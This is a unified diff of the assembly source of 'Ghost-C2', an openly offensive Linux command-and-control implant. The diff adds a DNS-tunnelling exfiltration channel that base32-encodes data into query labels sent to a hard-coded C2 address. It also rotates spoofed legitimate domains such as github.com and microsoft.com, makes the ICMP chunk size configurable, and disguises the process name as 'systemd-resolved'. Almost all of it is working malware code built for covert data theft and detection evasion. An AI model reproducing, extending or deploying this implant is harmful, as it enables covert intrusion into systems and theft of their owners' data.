@@ -10,7 +10,7 @@ BITS 64
 ;     \|_______|\|__|\|__|\|_______|\_________\   \|__|       \|______\|_________|
 ;                                  \|_________|                                   
 ; ===================================================================================
-; Project      : Ghost-C2 (v3.6.2) - "The Hybrid Phantom (Dual-Channel PIC Agent)"
+; Project      : Ghost-C2 (v3.6.3) - "The Hybrid Phantom (Dual-Channel PIC Agent)"
 ; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
 ; Architecture : x86_64 Linux (Pure Assembly, Libc-free, 100% PIC)
 ; -----------------------------------------------------------------------------------
@@ -197,12 +197,12 @@ _chunk_loop:
     cmp r14, 0
     jle .check_last_chunk           
     ; FRAGMENTATION: Split output into 56-byte chunks
-    cmp r14, 56           
+    cmp r14, [rbp + 0x3018]     ; dynamic chunk size           
     jg .set_max_chunk               
     mov r12, r14            
     jmp .copy_data
 .set_max_chunk:
-    mov r12, 56
+    mov r12, [rbp + 0x3018]
 .copy_data:
     cld
     lea rdi, [rbp + 0x100 + 32]     ; Write data after 8 (Header) + 24 (Mimicry)
@@ -231,7 +231,7 @@ _chunk_loop:
     jmp _chunk_loop                 
 .check_last_chunk:
     ; Check if an EOF packet is needed
-    cmp r12,56                    
+    cmp r12, [rbp + 0x3018]                    
     jne _sniff                      
     ; Send 1-byte EOF packet
     mov r12, 1                      
@@ -480,7 +480,9 @@ _icmp_init:
     mov rsi, 3                  ; SOCK_RAW
     mov rdx, 1                  ; IPPROTO_ICMP
     syscall                     
-    mov [rbp + 0x10], eax       
+    mov [rbp + 0x10], eax
+    
+    mov qword [rbp + 0x3018], 56 ; for dynamic chunk size 
     ret
 
 _icmp_send:
@@ -598,84 +600,105 @@ _icmp_recv:
 ; =================================================================
 ; GHOST-C2 PROTOCOL MODULE: DNS (AGENT SIDE - PIC COMPLIANT)
 ; =================================================================
+
 _dns_init:
-    mov rax, 41             ; syscall: socket
-    mov rdi, 2              ; AF_INET
-    mov rsi, 2              ; SOCK_DGRAM
-    mov rdx, 17             ; IPPROTO_UDP
+    mov rax, 41
+    mov rdi, 2                  ; AF_INET
+    mov rsi, 2                  ; SOCK_DGRAM
+    mov rdx, 17                 ; IPPROTO_UDP
     syscall
     test rax, rax
-    js _exit                ; Hata varsa sessizce öl
-    mov [rbp + 0x10], eax   ; FD'yi Stack Anchor'a güvenle kaydet!
+    js _exit
+    mov [rbp + 0x10], eax
+    
+    mov qword [rbp + 0x3020], 0
+    mov qword [rbp + 0x3018], 35    ; DNS chunk size
+
     ret
 
-_dns_send:
-    lea rdi, [rbp + 0x500]  ; Ajanın DNS Paket Gönderme Buffer'ı
+; -----------------------------------------------------------------
 
+_dns_send:
+    lea rdi, [rbp + 0x500]
+
+    ; === 1. DNS HEADER ===
 .retry_rand:
     rdrand eax
     jnc .retry_rand
     mov dl, 0xFF
     sub dl, al
     mov ah, dl
-    mov word [rdi], ax
-    mov dword [rdi + 2], 0x01000001
+    mov word [rdi], ax              ; TX ID (sum=0xFF)
+    mov dword [rdi + 2], 0x01000001 ; Flags=0x0100, QDCOUNT=1
     mov dword [rdi + 6], 0
-    mov word [rdi + 10], 0
+    mov word  [rdi + 10], 0
+    add rdi, 12
 
-    add rdi, 12                     ; QNAME başlangıcına zıpla
+    ; === 2. PAYLOAD LABEL ===
+    test r12, r12
+    jz .skip_encode
 
-    ; --- R12 (Veri) Kontrolü ---
-    test r12, r12                   ; İlk beacon (0 bayt) mı?
-    jz .skip_encode                 ; Evetse şifrelemeyi atla!
+    push rdi                        ; length byte pozisyonu
+    inc rdi
 
-    ; Payload Kodlama
-    lea rsi, [rbp + 0x100 + 32]     ; Şifreli ajan verisinin adresi
-    mov rcx, r12                    ; R12'de boyut var
-    mov rax, r12
-    shl rax, 1                      ; Boyutu 2 ile çarp (Hex uzunluğu)
-    mov byte [rdi], al              ; DNS Label uzunluğunu yaz
-    add rdi, 1                      ; İleri kay
+    lea rsi, [rbp + 0x100 + 32]     ; XOR'lanmış data
+    mov rcx, r12                    ; byte sayısı (max 35)
+    call _dns_encode                ; rax = yazılan char sayısı
 
-    call _dns_encode                ; Şifrele (RDI otomatik ilerler)
+    pop rbx
+    mov byte [rbx], al              ; length byte yaz
 
 .skip_encode:
-    ; Fake Domain'i kopyala
-    lea rsi, [rel fake_domain]      ; REL kullanarak PIC uyumlu kopyalama
+    
+; === 3. DOMAIN (rotation) ===
+    mov rax, [rbp + 0x3020]        ; mevcut index
+    mov rcx, rax
+    inc rax
+    cmp rax, 5
+    jne .no_reset
+    xor rax, rax
+.no_reset:
+    mov [rbp + 0x3020], rax        ; index güncelle
+    imul rcx, rcx, 20              ; offset hesapla
+    lea rsi, [rel domain_pool]
+    add rsi, rcx                   ; domain seç
 .copy_domain:
     lodsb
     stosb
     test al, al
     jnz .copy_domain
 
-    mov dword [rdi], 0x01001000     ; QTYPE ve QCLASS
+    ; === 4. QTYPE A + QCLASS IN ===
+    mov dword [rdi], 0x01000100
     add rdi, 4
 
-    ; Dinamik Boyut Hesaplama
+    ; === 5. GÖNDER ===
     lea r8, [rbp + 0x500]
     mov rdx, rdi
-    sub rdx, r8                     ; RDX = Toplam Paket Boyutu
+    sub rdx, r8
 
-    mov rax, 44                     ; sys_sendto
-    mov edi, dword [rbp + 0x10]     ; FD'yi Anchor'dan AL!
-    lea rsi, [rbp + 0x500]          ; Gönderilecek Buffer
+    mov rax, 44
+    mov edi, dword [rbp + 0x10]
+    lea rsi, [rbp + 0x500]
     mov r10, 0
-    lea r8, [rel master_addr]       ; HEDEF İP (Aşağıdan Okuyacak)
+    lea r8, [rel master_addr]
     mov r9, 16
     syscall
 
     call _lcg_jitter
     ret
 
+; -----------------------------------------------------------------
+
 _dns_recv:
-    lea rdi, [rbp + 0x2000]             ; Recv Buffer'ı temizle
+    lea rdi, [rbp + 0x2000]
     xor al, al
     mov rcx, 1200
     rep stosb
 
     mov dword [rbp + 0x14], 16
-    mov rax, 45                         ; sys_recvfrom
-    mov edi, dword [rbp + 0x10]         ; FD'yi Anchor'dan AL!
+    mov rax, 45
+    mov edi, dword [rbp + 0x10]
     lea rsi, [rbp + 0x2000]
     mov rdx, 1200
     xor r10, r10
@@ -686,52 +709,26 @@ _dns_recv:
     cmp rax, 12
     jb .invalid_packet
 
+    ; TX ID auth
     movzx ebx, word [rbp + 0x2000]
     add bl, bh
     cmp bl, 0xFF
     jne .invalid_packet
 
-    ; --- DNS DECODER (QNAME İLK ETİKETİ OKU VE ÇEVİR) ---
-    lea rsi, [rbp + 0x2000 + 12]        ; QNAME başlangıcı
-    lodsb                               ; AL = Hex uzunluğu
+    ; QNAME
+    lea rsi, [rbp + 0x2000 + 12]
+    lodsb
     test al, al
-    jz .invalid_packet                  
-    
-    movzx rcx, al
-    shr rcx, 1                          ; Gerçek boyut (Hex/2)
-    push rcx                            ; RAX için sakla
-    
-    lea rdi, [rbp + 0x2000 + 300]        ; KÖPRÜ OFSETİ
-    
-.decode_loop:
-    lodsb
-    cmp al, '9'
-    jbe .is_num1
-    sub al, 0x57
-    jmp .merge1
-.is_num1:
-    sub al, 0x30
-.merge1:
-    shl al, 4
-    mov dl, al
-    
-    lodsb
-    cmp al, '9'
-    jbe .is_num2
-    sub al, 0x57
-    jmp .merge2
-.is_num2:
-    sub al, 0x30
-.merge2:
-    add al, dl
-    stosb
-    
-    dec rcx
-    jnz .decode_loop
-    
-    pop rax                             ; Orijinal boyutu RAX'a çek
-    
-    ; --- YENİ KÖPRÜ: İşlem bitince temiz veriyi asıl yerine (52) taşı ---
+    jz .invalid_packet
+
+    movzx rcx, al                       ; char sayısı
+
+    push rcx
+    lea rdi, [rbp + 0x2000 + 300]
+    call _dns_decode                    ; rax = byte sayısı
+    pop rcx
+
+    ; bridge 300 → 52
     push rax
     mov rcx, rax
     lea rsi, [rbp + 0x2000 + 300]
@@ -745,47 +742,139 @@ _dns_recv:
     xor rax, rax
     ret
 
-	
+; -----------------------------------------------------------------
+
 _dns_encode:
-	test rcx, rcx       ; Veri var mı?
-    jz .done
-	push r15
-	push r14
-	push r13
-	xor r15, r15
-	mov r14d, 0x30
-	mov r13d, 0x57
-	cld
+    push rbx
+    push r12
+    push r13
+    push r14
+    push r15
 
-.next_byte:
-	; THIS SECTION FOR ASCII TRANSLATION
-	
-	lodsb
-	mov dl, al					; backup
-	shr al, 4
-	cmp al, 9
-	cmovbe r15d, r14d			; if al less than 9
-	cmova r15d, r13d			; if al greater than 9
-	add al, r15b					; adding r15 to al
-	stosb
-	
-	mov al, dl					; getting back the backup
-	and al, 0x0F
-	cmp al, 9
-	cmovbe r15d, r14d
-	cmova r15d, r13d
-	add al, r15b
-	stosb
+    lea r13, [rel b32_alpha]
+    mov r15, rcx
+    xor r14, r14
 
-	dec rcx
-	jnz .next_byte
+.group_loop:
+    test r15, r15
+    jz .enc_done
 
-	
-.done:
-	pop r13
-	pop r14
-	pop r15
-	ret
+    xor rbx, rbx
+    xor r12, r12
+
+.load_bytes:
+    cmp r12, 5
+    je .encode_group
+    test r15, r15
+    jz .encode_group
+
+    shl rbx, 8
+    lodsb
+    movzx rax, al
+    or rbx, rax
+    inc r12
+    dec r15
+    jmp .load_bytes
+
+.encode_group:
+    push rcx
+    mov ecx, 5
+    sub ecx, r12d
+    shl ecx, 3
+    shl rbx, cl
+    pop rcx
+
+    lea rax, [rel b32_char_cnt]
+    movzx ecx, byte [rax + r12]
+
+.extract_chars:
+    test ecx, ecx
+    jz .group_loop
+
+    mov rax, rbx
+    shr rax, 35
+    and eax, 0x1F
+    movzx eax, byte [r13 + rax]
+    stosb
+    inc r14
+
+    shl rbx, 5
+    dec ecx
+    jmp .extract_chars
+
+.enc_done:
+    mov rax, r14
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    ret
+
+; -----------------------------------------------------------------
+
+_dns_decode:
+    push rbx
+    push r12
+    push r13
+    push r14
+    push r15
+
+    mov r15, rcx                ; char sayısı
+    imul rcx, rcx, 5
+    shr rcx, 3                  ; byte sayısı
+    mov r14, rcx
+
+    xor rbx, rbx
+    xor r12, r12
+
+.dec_loop:
+    test r15, r15
+    jz .dec_done
+
+    lodsb
+    dec r15
+
+    cmp al, 'a'         ; 0x61 - doğru eşik
+    jae .is_alpha       ; >= 'a' ise letter
+    sub al, '2'         ; digit '2'-'7'
+    add al, 26
+    jmp .got_val
+.is_alpha:
+    sub al, 'a'
+.got_val:
+    and rax, 0x1F
+    shl rbx, 5
+    or rbx, rax
+    add r12, 5
+
+.extract_bytes:
+    cmp r12, 8
+    jl .dec_loop
+
+    mov rcx, r12
+    sub rcx, 8              
+
+    mov rax, rbx
+    shr rax, cl             
+    and eax, 0xFF
+    stosb
+
+    mov rax, 1
+    shl rax, cl             
+    dec rax
+    and rbx, rax
+    sub r12, 8
+    jmp .extract_bytes
+
+.dec_done:
+    mov rax, r14
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    ret
 
 _switch_to_dns:
     ; 1. Eski soketi kapat (Clean Exit)
@@ -865,7 +954,7 @@ master_addr:
     ; sin_addr: The IP Address of your Master C2 Server.
     ; Format: Comma-separated decimal values. 
     ; Example: If Master is 192.168.1.15 -> change to: db 192, 168, 1, 15
-    db 127, 0, 0, 1     
+    db 192, 168, 1, 37     
     
     ; sin_zero: 8 bytes of padding to match the standard socket structure size.
     dq 0                
@@ -878,15 +967,22 @@ master_addr:
 ; 
 ; FORMAT RULE (RFC 1035): [Length], "Label", [Length], "Label", 0 (Null-terminated)
 ; Example 1: "c2.com"      -> db 2, "c2", 3, "com", 0
-; Example 2: "update.net"  -> db 6, "update", 3, "net", 0
-
-fake_domain db 5, "ghost", 3, "com", 0   
+; Example 2: "update.net"  -> db 6, "update", 3, "net", 0 
 ; ============================================================================
 
 fake_name    db "systemd-"
 
 fake_name_1  db "resolved", 0
 
+b32_alpha:    db 'abcdefghijklmnopqrstuvwxyz234567'
+b32_char_cnt: db 0, 2, 4, 5, 7, 8
+
+domain_pool:
+    db 6,'github',3,'com',0,0,0,0,0,0,0,0,0
+    db 9,'microsoft',3,'com',0,0,0,0,0,0
+    db 10,'cloudflare',3,'com',0,0,0,0,0
+    db 6,'google',3,'com',0,0,0,0,0,0,0,0,0
+    db 7,'windows',3,'com',0,0,0,0,0,0,0,0
 
 
 delay_req:
